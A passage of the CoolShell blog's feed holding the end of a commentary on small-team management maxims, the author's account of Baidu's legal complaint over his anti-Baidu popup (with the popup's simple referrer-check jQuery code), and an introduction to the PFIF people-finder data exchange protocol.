<blockquote><p><strong>感想</strong>：这世上除了“他爹的TDD”开发模式，还有“他妈的TMD”开发，就是Team Meeting Driven，很多公司有太多太多的会要开了，开会基本上成了每天工作最主要的东西，对于一些管理者来说一星期中居然有80%时间都在开会。其实，这么多的会议并不意味着你在管理，只是意味着你对要管的东西完全不知道，需要通过开会来了解。很多会完全是没有议题的，大家坐在一起东拉西扯，非常非常地低效。我通常把这种会叫做“神仙会”，用个流行语来说，就是Cloud Meeting，大家神一要的各说各的，似乎，没有这种形式，不能证明参会者的存在，用会议来证明他们的存在，相当的可笑。对我来说，<strong>如果只是带一个或几个问题来开会，简直是就是扯谈，如果对于问题没有几个备选的解决方案和各方案的评估，完全没有必要开会</strong>。Amazon的会议是不会有PPT的，会议组织者会要要讨论的东西写好并打印出来，在会前给参会者把要讨论的东西打印出来，开会前10分钟左右，会场里没有任何声音，每个人都在读文档，全部人读完后，直接对议题发表自己的个人意见应该怎么干，然后很快形成共识，散会。</p></blockquote>
<h4>
<span class="ez-toc-section" id="%E4%BA%BA%E4%BA%BA%E9%83%BD%E5%BE%97%E5%B9%B2%E6%B4%BB"></span>人人都得干活<span class="ez-toc-section-end"></span>
</h4>
<p>在一个小团队里，你需要的是干活的人，而不是监工。每个人都得做事，没有人可以袖手旁观 。</p>
<p>这意味着你在招聘中要避免招到监工型的人物，这些人喜欢对别人谆谆教导。对于小团队来讲监工型的人就是累赘。</p>
<p>监工们还喜欢把人拖去开会。实际上，会议是监工们最好的朋友，因为只有在开会时才显得出他们的重要。</p>
<blockquote><p><strong>感想</strong>：<strong>为什么会有办公室政治，那就是因为这个公司里有一部分人不干活，不做事，</strong>于是，他们就有大量地时间开始胡思乱想，他们花大量的时间不是想怎么去做事，而是想自己怎么更容易的打垮别人得到上面的认可，从而得到晋升。在大公司中这样的情况会比Startup的公司多得多。所以，如果你不想滋生办公室政治，那么你需要干两个事，第一个是最好不要变成大公司，第一个是让每个人都在实干。我最近看到其大公司，虽然很多东西不规范，而且很多东西在野蛮生长，有些事情也有点土，但绝大多数人都在实干，所以，只要每个人都在实干，就算干的方式不好，干出来的东西有问题，也比那些滋生办公室政治的公司强上几百倍</p></blockquote>
<h4>
<span class="ez-toc-section" id="%E6%8B%92%E7%BB%9D%E7%85%A7%E6%90%AC_%E5%B0%86%E4%BD%A0%E7%9A%84%E4%BA%A7%E5%93%81%E5%8E%BB%E5%95%86%E5%93%81%E5%8C%96"></span>拒绝照搬 &amp; 将你的产品去商品化<span class="ez-toc-section-end"></span>
</h4>
<p>有时候，照猫画虎也是一种学习过程，就好像艺术系的学生通过临摹美术馆的作品来学习绘画。当你还是一个学生时，这种模仿是一种很有效的学习工具。不幸的是，商业战场上的模仿却不招人待见。而这也意味着你打算通过当盲从者或抄袭者的方式来建立你的事业，这注定是一个失败模式。</p>
<p>模仿的问题在于，简单的复制扼杀了深层的理解——而理解才能激发成长。你不但要知其然，还要知其所以然。而当你复制时，你会忽视这一点。你照搬的只是表面，而不是本质。</p>
<p>一旦你扬名立万，模模仿者会蜂拥而至，这就是生活。但你可以用一种绝佳的方式来保护自己不被 他们吞没：让你自己成为你的产品或服务的一部分。</p>
<blockquote><p><strong>感想</strong>：在《<a title="抄袭，腾讯 和 产品" href="https://coolshell.cn/articles/7617.html" target="_blank" rel="noopener">抄袭，腾讯 和 产品</a>》中我谈到过这个事情，虽然我对抄袭和山寨很反感，但是我不得不承认这是这个世界的一部分，好的东西总是会被人复制的，这也不一定是一个坏事，这会让你更清楚认识到什么是真正产品的价值，什么是核心竞争力，你但凡有一点急功近利的想法你都要想一想那堆抄袭者，其中还不乏有钱有人的专业抄袭的公司。而面对被抄袭这样的事情，最好的解决方法是着眼着远期而不是短期——<strong>如果你着眼短期，你无疑会面对众多的抄袭和模仿者让你万劫不复，但是，如果你着眼长期，做一个3-5年需要花费大量精力才会成熟的产品，那么，那些急功近利的抄袭者会知难而退的，因为长期并不符合抄袭者的价值观</strong>。</p></blockquote>
<h4>
<span class="ez-toc-section" id="%E5%81%9A%E5%BE%97%E6%AF%94%E5%AF%B9%E6%89%8B%E5%B0%91"></span>做得比对手少<span class="ez-toc-section-end"></span>
</h4>
<p>传统智慧告诉我们，要想打败竞争者就要胜人一筹。如果人家有 4 个功能，你就得 5 个（或者 15 个，25 个）。如果人家花了$20,000，你就得花 $30,000。如果人家有 50 个员工，你就得要 100 个。</p>
<p>这样的冷战式的攀比思维会把人引上绝路。一旦被卷入“军备竞赛”，你就陷入了一场无止境的战争，这场战争会让你耗费大量的金钱、时间和动力。并且使你陷入长期的防御战中。处于防御状态的公司是没有预见力的；他们只能后知后觉，他们无法领跑，只能尾随。</p>
<p>那么你应该怎么做呢？比你的竞对手做得少，以此来打败他们。<strong>让自己去解决简单的问题，把那些纠结的、麻烦的、艰难的、讨厌的难题留给竞对手去解决</strong>。不要总想着去胜人一筹、去超过别人，试试相反的做法。</p>
<p>不要因为你的产品或服务不如别人的花哨就感到自惭形秽。把他们做得醒目高调，并引以为傲。就像对手那些强有力的销售他们多功能的产品一样销售你那简约的产品。</p>
<blockquote><p><strong>感想</strong>：一个最典型的例子就是iPad，它干得比Laptop少，比上网本少，就是一个很简单的上网和简单游戏的设备，但是他有非常简单的用户体验，让两三岁的儿童和六七十岁的老人都能很快上手。你相信吗？我花了好多年都没教会我父母用电脑以及手机里除了电话功能外的其它功能，但我只花了10分钟就教会他们使用iPad上网了。这就是“做得比对手少”的强大。<strong>只有简约的东西，才会显得更精致，才会显得更专业</strong>。</p></blockquote>
<h4>
<span class="ez-toc-section" id="%E8%B0%81%E5%9C%A8%E4%B9%8E%E4%BB%96%E4%BB%AC%E5%9C%A8%E5%B9%B2%E4%BB%80%E4%B9%88"></span>谁在乎他们在干什么<span class="ez-toc-section-end"></span>
</h4>
<p>不管怎样，终究是不值得过于关注你的竞争者。为什么？因为<strong>关注别人太多会让自己受到困扰</strong>。他们现在在做什么？他们下一步呢？我们该怎样作出回应？</p>
<p>每一个小小的动作都会被分析一下。那是一种可怕的心态。这会产生不可抗拒的压力和焦虑。这样的想法会滋长不好的东西。</p>
<p>这是没有意义的事情。竞争者的风景时时在变。你的竞争对手明天一个样儿，今天一个样儿。完全在你控制之外。去担心你所不能控制的事情有意义吗？</p>
<p>过于关注竞争者会混淆你的视野。当你一直吸收别人思想时， 你的机会则会减少。你变得反动而不是充满想象力。你只不过是将你竞对手的产品换了个包装。</p>
<p>如果你打算做一个“the iPod killer”或“the next Pokemon”，你已经死了。你是在承认你的竞争者所设定的参数。你没有跳出 Apple 的套路。他们制定了这个游戏规则。你不可能打败制定规则的那个人。你必须重新制定一个规则，而不是稍微改建一点点。</p>
<blockquote><p><strong>感想</strong>：这个社会浮躁之处就在于我们太多的观注了别人，人比人气死人。我们很多人都注意到了别人的风光，看到别人创业被注资，看到别人找到了好的工作，看到了别人不走正道而发达，看到了别人很轻松还挣得多，甚至看到别人的粉丝比自己多，等等，等等，这些东西让自己的心态变，变得非常地不淡定了。眼红也是魔鬼，因为眼红让人心理扭曲了的例子还少吗？<strong>不要在乎别人干了什么，你应该多看看自己的长处是什么，每个人都有每个人的路，你要做的是按照自己的节奏和自己擅长的方式行事，而不是小猫钓鱼</strong>。</p></blockquote>
<h4>
<span class="ez-toc-section" id="%E5%85%BB%E6%88%90%E5%AF%B9%E5%AE%A2%E6%88%B7%E8%AF%B4%E4%B8%8D%E7%9A%84%E4%B9%A0%E6%83%AF"></span>养成对客户说“不”的习惯<span class="ez-toc-section-end"></span>
</h4>
<p>说“好的”很容易。我们很容易接受同意一个新功能、同意一个过于乐观的截止日期、笑纳一个平庸的设计。很快，一大堆你曾经说“yes”的事情就发生连锁反应，很多你不想要的东西越堆越高，甚至你都看不出原来想要的东西。</p>
<p>别相信“顾客永远是对的”这类的话。如果你是一个大厨，你的很多客人说你做的菜太咸或者太烫，你可以改。但是如果有一些挑剔的老主顾要求在宽面条里面加些香蕉，你千万不要理会他们，没关系。若是为了少数顾客的要求而毁了产品不值得。</p>
<p><strong>你的目标是确保你的产品与就是和你合拍的产品，你就是你自己产品最踏实的粉丝。你是最信赖它的那个人</strong>。那样的话，你会说：“我想你也会爱它的，因为我爱它。”</p>
<blockquote><p><strong>感想</strong>：亨利福特说过：“如果我要问我的客户要什么，他们会告诉我他们要一匹更快的马”，所以，过份的迁就用户并不是一件好的事，相反会是一件很不好的事。互联网和电视节目一样都有一个万恶的KPI，电子节目那万恶的KPI是收视率，而互联网的万恶KPI是流量。于是<strong>很多公司为了流量开始不择手段，就像电视节目用庸俗化来提高收视率一样，我们的一些互联网产品也使用庸俗化的东西来提高流量。我们要做的是一个让人称道的有品质的产品，而不是一个只有访问量的产品</strong>。</p></blockquote>
<h4>
<span class="ez-toc-section" id="%E4%B8%8D%E8%A6%81%E6%94%80%E5%AE%A2%E6%88%B7%E7%9A%84%E9%AB%98%E6%9E%9D"></span>不要攀客户的高枝<span class="ez-toc-section-end"></span>
</h4>
<p>也许你曾经见过这样的场景：一个顾客向一家公司投了很多钱。这家公司想要尽可能的取悦那个顾客。为了迎合这个客户的要求而改变自己的产品，渐渐地，你的产品就会脱离普遍客户的基础。</p>
<p>而且，突然有一天，这个大客户绝尘而去，公司则会背负一个包袱——这个产品是围绕着一个已经离开了的人设计的。而其他人没法用。</p>
<p>人在变，环境在变，你不可能满足所有人的所有要求。<strong>公司要对某一类型的客户全情投入，而不是对某个善变的客户唯唯诺诺</strong>。</p>
<blockquote><p><strong>感想</strong>：你永远要找到自己的定位，你不可能满足所有的人。就像屌丝们喜欢的北京的动物园批发市场和高富帅们喜欢的北京燕莎商场一样，他们分别定位于不同的用户。你的产品从生下来的那一时刻就应该需要做好定位，是面对什么样的人群。而且，你也不可能实现所有人的需求的。有时候，失去一些客户并不是坏事，<strong>我们要做的是管理我们的客户，让客户认同我们，而不是被客户牵着走</strong>。</p></blockquote>
<h4>
<span class="ez-toc-section" id="%E4%B8%80%E5%A4%9C%E6%88%90%E5%90%8D%E5%8F%AA%E6%98%AF%E4%BC%A0%E8%AF%B4"></span>一夜成名只是传说<span class="ez-toc-section-end"></span>
</h4>
<p>你不会瞬间大红大紫，也不会一夜暴富，你所了解的那些道听途说的“一夜成名”的故事，深挖一点，你就能发现这些成功人士在到达引爆点之前，都已经在这个方向 上苦熬了很长时间。</p>
<p>把一夜成名的迷梦换成一步一个脚印的成长行动吧。道路很艰难，但你必须充满耐心。你得用功去做，在遇到伯乐前，你得努力很长时间。</p>
<blockquote><p><strong>感想</strong>：这和我在<a title="程序算法与人生选择" href="https://coolshell.cn/articles/8790.html">程序算法与人生选择</a>一文中所说的那个最短路径的算法的类比一样，与其展望要当什么架构师或是要成为牛人的憧憬，不如把身边看得见够得着的东西学扎实，干出色。一夜成名只是一个传说，你知道酷壳是因为我写十多年的博客，你知道我是因为我积累了十多年的编程，看看酷壳以前介绍过的<a href="https://coolshell.cn/articles/5651.html" target="_blank" rel="noopener">王平同学</a>吧。<strong>很多事情都不是偶然的，都是有前兆的，还是我<a href="https://coolshell.cn/articles/7048.html" target="_blank" rel="noopener">以前说过的那句话</a>，“如果一件事情以前没有发生过，未来也不会发生”，比如：如果你在学校里，在工作里，你的同学和同事并不经常来向你请教询问你的意见，那么你基本上很难成为一个Leader</strong>。</p></blockquote>
<h4>
<span class="ez-toc-section" id="%E5%91%98%E5%B7%A5%E4%B8%8D%E6%98%AF13%E5%B2%81"></span>员工不是13岁<span class="ez-toc-section-end"></span>
</h4>
<p><strong>当你把员工当孩子看时，人们就会像孩子一样行事</strong>。</p>
<p>当公司里事事都要上报审批时，你就创造出了一种无脑文化。你成功地制造出了老板和员工之间的对立关系。这种关系在咆哮着：“我不相信你！”</p>
<p>当你处处限制员工，比如禁上他们在上班时访问外部网站或是开小差，你会得到什么好处？什么也得不到。人们需要开小差，这有助于打破整日的枯燥单调，花点时间上上Youtube或Facebook不会失去什么。</p>
<p>如果你要监控你的员工，你得想想你要花多少时间和金钱来监管员工。你浪费了多少钱去安装监控软件？你浪费了多少人力资源去监视员工？你浪费了多少时间去写没有人会看的规章制度？<strong>看看这些成本，你很快就发现，对员工的不信任才是最大的开销</strong>。</p>
<blockquote><p><strong>感想</strong>：我始终在跟我的团队成员说，最有效的管理就是自己管理自己，而不是还要专们的人来管你。不然的话，你一定会很难受的。如果你能管理好你的工作和任务，我们就不需要项目经理。如果你能管理得好你的做事的方法和流程，就不需要那些搞流程的。如果你能管理得好你的程序质量，我们就不需要QA来监管你…… 等等。<strong>其实，你们如果能管理得好自己，并能自我进化。你们甚至不需要一个经理。但是，你们可能会需要一个为你们跑腿打杂的人，其实，那个人就是经理</strong>。</p></blockquote>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-03-11T08:25:34+08:00</pubDate>
<guid>https://coolshell.cn/articles/9156.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ “作环保的程序员，从不用百度开始” ]]></title>
<link>https://coolshell.cn/articles/9308.html</link>
<content><![CDATA[ 
<p>酷壳对来自百度搜索引擎的访问会弹窗，但是我的这个行为发酵出了一些事情，这里把这个事情说明如下，我会更新相关的东西。内行看门道，外行看热闹。</p>
<h4>事由</h4>
<p><strong>2月6日</strong> 看到<a href="https://weibo.com/1497035431/zi69DBK3b" target="_blank" rel="noopener">梁斌同学的微博</a>（起因可能是因为梁斌同学在微博上对帮助百度的一些工程师们说话导致他的“<a href="http://xunren.thuir.org/" target="_blank" rel="noopener">微博寻人</a>”全站被百度屏蔽）</p>
<p><img alt="image placeholder" ></p>
<p>我看到后，觉得梁斌同学有点太看重被百度收录了，没有站长应该有的气质，所以，我<a href="https://weibo.com/1401880315/zibYUvZYd" target="_blank" rel="noopener">回了一个微博</a>——</p>
<blockquote><p>“我的酷壳倒反而因为被百度收录而感到掉价！”</p></blockquote>
<p><strong>2月6日当天</strong>，我给coolshell做了个弹窗，并发布微博—— （该微博目前已被新浪管理员删除，后面有说明）</p>
<p><span id="more-9308"></span></p>
<blockquote>
<p>“搞定收工！从百度访问过来的访问弹出对话框。（CoolShell上的网页有缓存，要过些时间才有效）”</p>
<p><img alt="image placeholder" ></p>
</blockquote>
<p><strong>2月21日</strong>：百度的法律顾问发来邮件。</p>
<blockquote>
<p>From: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="166e6e6e6e6e6e5674777f72633875797b">[email protected]</a><br>
To: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="b4dcd5dbd1d8f4dcdbc0d9d5ddd89ad7dbd9">[email protected]</a><br>
CC: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="552d2d2d2d2d2d1537343c31207b363a38">[email protected]</a><br>
Subject: 答复: 网站coolshell.cn弹窗事宜<br>
Date: Thu, 21 Feb 2013 07:05:09 +0000</p>
<p>陈浩，您好！</p>
<p>我是百度法务部法律顾问，就您的网站上有贬损百度商标的弹窗，以及通过微博等途径予以传播事宜，我们希望您及时终止。</p>
<p>如您不希望百度搜索收录您的网页，您可以通过Robots 协议予以规定。关于如何禁止百度Robots收录您的网站，如您需要技术方面的支持，我可以协助联系百度的工程师与您沟通。</p>
<p>如有任何问题，请随时联系。</p>
<p>谢谢！</p>
<p>段志勇</p>
</blockquote>
<p>我当天回复邮件到——</p>
<blockquote><p>『我是酷壳的法律顾问，请百度停止收录酷壳的网页，以及在所有百度产品线里删除酷壳的文章，尤其是百度文库里我所有的文章和PPT，你们已经违反了中华人民共和国版权著作法，酷壳将保留行使法律的权力』</p></blockquote>
<p><strong>3月2日</strong>：<a href="http://service.account.weibo.com/show?rid=K1CaJ6QFe6K4d" target="_blank" rel="noopener">新浪微博举报大厅</a>。（把我2月6日弹窗的微博给删除了，注意，其中没有我自辩的过程，还有其中荒唐的逻辑）</p>
<p style="padding-left: 30px;"><a href="http://service.account.weibo.com/show?rid=K1CaJ6QFe6K4d" target="_blank" rel="noopener">http://service.account.weibo.com/show?rid=K1CaJ6QFe6K4d</a></p>
<p style="padding-left: 30px;">我问新浪为什么没有我自辩的过程，新浪微博客服回服如下：</p>
<blockquote><p> 尊敬的新浪微博用户： 您好！关于您反馈的被举报问题，经核实此判决符合社区公约规定判定无误，感谢您的支持，祝您生活愉快~~</p></blockquote>
<p style="padding-left: 30px;">我没有多理会，留下一条“<a href="https://weibo.com/1401880315/zlCT8v4si" target="_blank" rel="noopener">多谢新浪和百度的自黑</a>”的微博我也没管这事了。</p>
<p><strong>3月22日</strong>：收到了来自百度律师代理的邮件，如下：</p>
<blockquote>
<p>From: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="80f8f8f8f8f8c0f4e5e5e8eff7e5aee3efed">[email protected]</a><br>
To: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="462e2729232a062e29322b272f2a6825292b">[email protected]</a><br>
Subject: 关于贵方酷壳网弹窗构成对百度公司的不正当竞争事宜<br>
Date: Fri, 22 Mar 2013 10:07:10 +0800</p>
<p>陈先生，您好！</p>
<p>我们，北京天昊联合知识产权代理有限公司，受百度在线网络技术（北京）有限公司（以下简称“百度公司”）委托就题述事宜特致函贵方（委托书请见附件）。</p>
<p>百度公司近日发现：用户在使用谷歌、360等浏览器通过百度搜索访问您方酷壳网（<a title="https://coolshell.cn/" href="https://coolshell.cn/" target="_blank" rel="noopener">https://coolshell.cn/</a>）时，会弹窗一个小窗，上面将百度LOGO打叉，并使用“DO EVIL”、“做环保的程序员，从不用百度开始！”等标语，详细截图后附。我们认为：您方弹窗所含图像及语言描述缺乏事实基础，带有较强的感情色彩，足以误导互联网用户对百度公司产生不合理的怀疑乃至负面评价，从而对百度公司的商业信誉和品牌形象带来一定程度的贬损。根据《反不正当竞争法》第2、14、20条之规定，您方行为已构成对百度公司的不正当竞争。</p>
<p>我们希望您方在收到此函后，清除所有相关侵权程序，立即停止对百度公司的所有侵权行为。我所当事人要求：贵方最迟于<strong><span style="text-decoration: underline;">2013年3月25日</span></strong>前向以下通信地址做出实质回应：</p>
<p>联系人：郑洪<br>
地址：北京市东城区建国门内大街28号民生金融中心D座10层<br>
邮编：100005<br>
电话：010-8529 5526<br>
传真：010-8529 5528</p>
<p>此信函不影响我方当事人依法所享有的其他任何权利或法律救济途径。我们希望此纠纷能尽快解决，以维护互联网市场的健康有序发展。</p>
<p>期待你方及时回复。如有任何问题，请随时与我们联系！</p>
<p>郑洪</p>
</blockquote>
<p>弹窗的抓图附件我就不列了，其中有一个委托书附件如下：</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<h4>几个观点</h4>
<p><strong>1）我非常不喜欢百度公司的非常浓重的商业化</strong></p>
<p style="padding-left: 30px;">我在《<strong><a href="https://coolshell.cn/articles/7186.html" target="_blank" rel="noopener">做个环保主义的程序员</a></strong>》一文中说过一些百度的问题，如：</p>
<ul>
<li>
<strong>搜索结果很差</strong>。一些非技术的东西都搜不出来。技术文章就更不要说了。再比如百度抓取酷壳的网页，一方面是不及时，另一方面是有选择地抓，很多网页并没有抓取到源文，而是抓取到那些转载过去没有注明出处的网站，像《<strong><a href="https://coolshell.cn/articles/7186.html" target="_blank" rel="noopener">做个环保主义的程序员</a></strong>》文章发布一年多了，过去的一年在百度里就查不到（这几天又能查到了）。（<strong>我很想了解百度的一些抓取网页的算法和搜索排名的算法，感觉相当诡异</strong>）</li>
</ul>
<ul>
<li>
<strong>有很多虚假广告</strong>。<strong>我觉得一家公司商业化并没有什么问题，但是这种商业化不应建立在牺牲用户利益的基础上的，这是最最基本的底线</strong>。我觉得百度的商业上在这方面突破了太多的底线。</li>
</ul>
<p><strong>2）百度应该可以做得更好</strong></p>
<p style="padding-left: 30px;">@<a title="陈晓鸣在百度" href="https://weibo.com/acumon">陈晓鸣在百度</a>在私下给我介绍了一些百度的广告方面的技术细节，说是以前的那个竞价排名不存在了。但是难免有一些垃圾和造假。就像淘宝一样也有假货和诈骗。是的，<strong>这中国目前这个大环境下，要有一个干净的平台的确不容易。但是我希望百度能像淘宝一样，在业务上做一些打击虚假信息的活动——建立举报制，曝光所有的虚假和欺诈信息，并有一些惩罚措施。可惜百度做得还很不够主动</strong>。（<span style="color: #cc0000;"><strong>与其花时间在我这里，不如花时间做好你自己的事</strong></span>）</p>
<p style="padding-left: 30px;"><strong>灰尘总是会有的，重点不在于灰尘和垃圾总是会有，重点在于想不想打扫。想不想打扫这是态度问题</strong>。</p>
<p><strong>3）看不起百度并不是看不起百度的技术人员</strong></p>
<p style="padding-left: 30px;"><strong>我是比较敬重百度的技术人员的。我还是能够“一分为二的看问题”</strong>。比如：deep learning专家余凯、主导凤巢设计的戴文渊，自然语言处理顶级会议的首任华人主席王海峰，架构专家，移动云技术负责人林仕鼎等等。都是值得我学习的很不错的技术牛人。</p>
<p style="padding-left: 30px;">我一向是站在技术人员这边的。这点，在这个事件中也不会改变。<strong>我还是会推荐一些刚毕业的实在找不到更好工作的学生去百度</strong>。正如我在《<a title="来信， 创业 和 移动互联网" href="https://coolshell.cn/articles/5815.html" target="_blank" rel="noopener">来信，创业，移动互联网</a>》一文中说的那样。入世和出世，取其精华去其糟粕。</p>
<p>4）<strong>关于弹窗这个事</strong></p>
<p style="padding-left: 30px;">关于弹窗这个事，<strong>我非常高兴酷壳成为了百度的竞争对手</strong>。我会接受网友的意见，<span style="color: #cc0000;"><strong>我会将把弹窗这个事变成不弹窗，直接嵌在酷壳的每一篇文章里</strong></span>。酷壳上基本坚持不投放任何广告，这回一定要做个公益广告。</p>
<p style="padding-left: 30px;">关于法律上的一些事情，我无所谓，<span style="color: #cc0000;"><strong>随时欢迎百度来起诉我，不来起诉就是怂包</strong></span>。以前当过原告起诉过清华大学出版社，今天当个被告，这样我的人生经历就完整了。大家知道，人生经历对我很重要。</p>
<p><strong>5）感动和回报</strong></p>
<p style="padding-left: 30px;">我把百度委托律师给我的邮件放到了我的微博里（<a title="新浪微博上的百度律师邮件" href="https://weibo.com/1401880315/zoF7ucEeR" target="_blank" rel="noopener">点击这里</a>），很多朋友说要捐钱给我打官司。这点到是不需要了。但是我真的很感动。所以——</p>
<p style="padding-left: 30px;"><span style="color: #cc0000; font-size: 16px;"><strong>我觉得我应该更多的珍惜大家对我的支持。如果你们在访问一些网站有什么困难的话，可以私下联系我，我愿意为你们提供相关的技术支持。这个事只能在私下做，你们懂的</strong></span>。</p>
<p style="padding-left: 30px;"><strong>当然，最好方式还是自建代理，如果你想DIY，<a href="https://github.com/haoel/haoel.github.io" target="_blank" rel="noopener">你可以看看这篇文章</a>。</strong></p>
<h4>附录：弹窗代码</h4>
<p>大家问我那个弹窗是怎么做的，很简单的，可以看看coolshell.cn的源代码。就是从referrer中匹配baidu。我用了jquery的一个插件：<a href="http://dinbror.dk/bpopup/" target="_blank" rel="noopener">bPopup</a>，关于那个no baidu插图来自：<a href="https://www.douban.com/online/10132155/" target="_blank" rel="noopener">豆瓣的拒绝百度的兴趣小组</a>。</p>
<p>源码如下：<strong><a href="https://weibo.com/n/Ninja_Lu" target="_blank" rel="noopener">@Ninja_Lu</a> 做了一个github的：<a href="https://github.com/lurongkai/anti-baidu" target="_blank" rel="noopener">https://github.com/lurongkai/anti-baidu </a></strong></p>
<p></p>
<pre data-enlighter-language="html" class="EnlighterJSRAW">&lt;script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js"&gt;&lt;/script&gt;
&lt;script src="https://coolshell.cn/wp-content/themes/inove/js/jquery.bpopup-0.8.0.min.js"&gt;&lt;/script&gt;

&lt;script type="text/javascript"&gt;
;(function($) {
    $(function() {
        var url=document.referrer;
        if ( url &amp;&amp; url.search("http://")&gt;-1) {
            var refurl =  url.match(/:\/\/(.[^/]+)/)[1];
            if(refurl.indexOf("baidu.com")&gt;-1){
                $('#nobaidu_dlg').bPopup();
            }
        }
    });

})(jQuery);
&lt;/script&gt;

&lt;div id="nobaidu_dlg" style="background-color:#fff; border-radius:15px;color:#000;display:none;padding:20px;min-width:450px;min-height:180px;"&gt;
    &lt;img src="https://coolshell.cn/wp-content/themes/inove/img/nobaidu.jpg" align="left"&gt;
     &lt;p style="margin-left:200px;margin-top: 20px; line-height: 30px;"&gt;
     检测到你还在使用百度这个搜索引擎，&lt;br/&gt;
     做为一个程序员，这是一种自暴自弃！&lt;br/&gt;
     &lt;br/&gt;
     &lt;/p&gt;
     &lt;p align="center" style="margin-top:20px;"&gt;
     &lt;b&gt;&lt;a href="https://coolshell.cn/articles/7186.html"&gt;作环保的程序员，从不用百度开始！&lt;/a&gt;&lt;/b&gt;
     &lt;/p&gt;
&lt;/div&gt;
</pre>
<p>P.S. robots.txt我已经加上了。</p>
<p>（全文完，谢谢大家的支持）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-03-23T21:47:20+08:00</pubDate>
<guid>https://coolshell.cn/articles/9308.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ PFIF网上寻人协议 ]]></title>
<link>https://coolshell.cn/articles/9508.html</link>
<content><![CDATA[ 
<p>本文的主要内容来自Wikipedia(<a href="https://en.wikipedia.org/wiki/People_Finder_Interchange_Format" target="_blank">http://en.wikipedia.org/wiki/People_Finder_Interchange_Format</a>)</p>
<p>PFIF全称People Finder Interchange Format，是一个应用广泛的数据开源的标准协议，这个协议主要是设计用来在不同的政府、救援组织、或是其它的一些灾难中生存者和其亲人联系的网站间进行数据交换的一种协议。</p>
<p><img alt="image placeholder" ></p>
<p>这个协议基于XML，信息中包括人的身份标识，还有人目前的位置和状态等一些信息。PFIF可以通过Atom和RSS feed出去。PFIF可以允许不同的寻人站点进行数据交换和合并。每一条记录都有一个唯一的标识，这个标识说明了这是由哪个域名创建的。这样，当A站点获得B点的某个人的数据时，在A站点可以对这个人的增加的信息可以转到其它站点上再被增加相关的信息，因为有一个唯一的ID，所以信息可以在不同的站点上被附加。</p>
<p>从wikipedia上看，说起PFIF这个事，得回到2001年的911事件，那时人们一共使用了超过25个不同的在线论坛和网上寻人站来查找相关的亲人和朋友（注：寻人网站英文叫：Survivor Registry，生还者登记网站）。其中一个最大的网站是由伯克利大学的学生Ka-Ping Yee 和 Miriam Walker 开发运行在Millennium计算集群上的safe.millennium.berkeley.edu网站。那时，为了减少各种网站间的混乱，伯克利的寻人网站开始从其它几个比较大的寻人站点收集相关的数据，并人肉整合到一起。</p>
<p><span id="more-9508"></span></p>
<p>2005年，在<a title="Hurricane Katrina" href="https://en.wikipedia.org/wiki/Hurricane_Katrina">卡特里娜飓风</a> 灾难的时候，有数据百万人迁移。于是相关的寻人网站又出现了，而且比911的还要多。于是有很多的志愿者开发了一个叫 <a title="Katrina PeopleFinder Project" href="https://en.wikipedia.org/wiki/Katrina_PeopleFinder_Project">Katrina PeopleFinder Project（卡特里娜寻人项目）</a> 他们人肉地收集不同站点的数据，并统一格式放到一个由Salesfore.com提供一个数据库中。这个项目的组织者David Geilhufe 呼吁一个技术标准以便这些寻人网站间的数据可以自动地整合共享在一起。于是之前伯克利的那个 <a href="http://zesty.ca/" target="_blank">Ka-Ping Yee</a> 开始和志愿者 Kieran Lal，Jonathan Plax 和 <a title="CiviCRM" href="https://en.wikipedia.org/wiki/CiviCRM">CiviCRM</a> 团队一同工作，于是开始了草拟了第一版的PFIF协议，其于2005年9月4日发布，1.1版于第二天发布，其中修改了一些错误。随后，Salesfore.com的数据库开始支持这一标准，然后，Yahoo!和Google的寻人网站也加入这一协议。</p>
<p>接下来， <a title="2010 Haiti earthquake" href="https://en.wikipedia.org/wiki/2010_Haiti_earthquake">2010年的海地地震</a> 时，Google发布了自己的 <a title="Google Person Finder" href="https://en.wikipedia.org/wiki/Google_Person_Finder">Google Person Finder</a>，其基于PFIF协议和CNN，纽约时报，以及美国国家医学图书馆和其它的一些寻人网站进行数据交换。然而，PFIF1.1是基于美国的社会标准搞的，并不适用于海地。于是2010年1月26日，PFIF1.2发布，其增加了几个字段用于标记生还者的国家和国际区号，还有性别，年纪，生日，状态，还有相同人的关联。</p>
<p>PFIF 1.3 于2011年3月发布，其主要解决了个人隐私问题，其加入了一个字段指明该信息的一个有效时间，过期的数据会被删除。PFIF1.3同时移除了英式的first-name和last-name，取而代之的是full-name。</p>
<p>PFIF 1.4 于2012年5月发布，其加入了一个字段用于链接这个人在互联网上的个人资源链接，这样可以用于合并相同的人（比如：指向同一个微博网址），还支持了多个照片。</p>
<p style="text-align: center;"><strong>PFIF1.4的Spec链接：<a href="http://zesty.ca/pfif/1.4/" target="_blank">http://zesty.ca/pfif/1.4/ </a></strong></p>
<p>如下的网站有软件实现了PFIF：</p>
<ul>
<li><a title="Google Person Finder" href="https://en.wikipedia.org/wiki/Google_Person_Finder">Google Person Finder</a></li>
<li><a title="Sahana FOSS Disaster Management System" href="https://en.wikipedia.org/wiki/Sahana_FOSS_Disaster_Management_System">Sahana Eden</a></li>
<li><a href="http://pl.nlm.nih.gov/index.php" rel="nofollow">National Library of Medicine People Locator</a></li>
<li><a title="Ushahidi" href="https://en.wikipedia.org/wiki/Ushahidi#Ushahidi">Ushahidi</a></li>
<li><a href="https://code.google.com/p/pfifnet/" rel="nofollow">PFIF .NET Library</a></li>
<li><a href="http://erislabs.net/ianb/projects/pfif/" rel="nofollow">XML::PFIF Perl module</a></li>
</ul>
